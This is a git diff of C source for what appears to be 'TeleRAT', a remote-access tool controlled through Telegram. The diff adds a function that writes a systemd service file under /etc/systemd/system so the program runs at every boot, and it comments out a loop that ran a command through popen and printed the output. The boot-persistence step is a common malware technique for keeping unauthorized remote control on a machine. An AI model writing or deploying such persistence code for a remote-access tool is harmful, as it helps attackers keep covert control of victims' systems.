@@ -10,6 +10,7 @@ struct cmdinfo{
     char cmd[5000];
 };
 
+
 //get Program Name
 struct cmdinfo getpName(struct cmdinfo pName){
     int len=0;
@@ -45,7 +46,29 @@ struct cmdinfo boom(struct cmdinfo cmd){
     return cmd;
 }
 
-
+void serviceSetting(struct cmdinfo cmd){
+	cmd = getnowPath(cmd);	
+	cmd = getpName(cmd);
+	//Connect path with program	
+	sprintf(cmd.cmd,"%s%s",cmd.nowPath,cmd.pName);
+	
+	//writing in /etc/systemd/system
+	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
+	if(f == NULL)
+	{
+	   printf("Error can't open file");
+	   exit(1);
+	}
+	
+ 	char text[3500];
+	sprintf(text,"[Unit]\n"
+		     "Description = TeleRAT Remote Administrator Via Telegram\n\n"
+		     "[Service]\n"
+		     "ExecStart =%s\n\n"
+		     "[Install]\n"
+		     "WantedBy=multi-user.target\n\n",cmd.cmd);
+	fprintf(f,"%s",text);
+}
 
 int main(int argc , char *argv[]){
     char buf[250];
@@ -57,14 +80,15 @@ int main(int argc , char *argv[]){
 
     // path = move(path);
     // path = boom(path);
-    FILE *fp = popen(path.cmd, "r");
+    serviceSetting(path); 
+//    FILE *fp = popen(path.cmd, "r");
     
-    while (fgets(buf, 200, fp))
-    {
-        printf("%s:",buf);
-        bzero(path.cmd,200);
-        bzero(buf,200); 
-    }
+//    while (fgets(buf, 200, fp))
+//     {
+//        printf("%s:",buf);
+//        bzero(path.cmd,200);
+//        bzero(buf,200); 
+//    }
 
 
     return 0;
